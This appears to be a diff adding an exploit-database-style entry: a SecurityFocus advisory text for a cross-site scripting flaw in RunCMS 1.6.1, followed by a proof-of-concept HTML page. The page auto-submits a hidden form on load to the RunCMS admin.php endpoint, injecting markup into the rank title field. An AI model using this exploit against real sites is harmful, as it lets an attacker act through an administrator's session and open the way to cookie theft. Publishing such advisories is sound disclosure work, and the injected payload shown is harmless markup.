@@ -1,0 +1,17 @@
+source: http://www.securityfocus.com/bid/27852/info
+
+RunCMS is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied input data.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+RunCMS 1.6.1 is vulnerable; other versions may also be affected. 
+
+<html><head></head><body onLoad="javascript:document.r.submit()">
+<form action="http://localhost/xampp/runcms/modules/system/admin.php"
+method="post" enctype="multipart/form-data" name="r">
+<input type="text" class="text" name="rank_title" size="30" maxlength="50"
+value="<marquee>Cross-Site Scritping :-("/>
+<input type="hidden" name="fct" value="userrank">
+<input type="hidden" name="op" value="RankForumAdd">
+</form>
+</body>
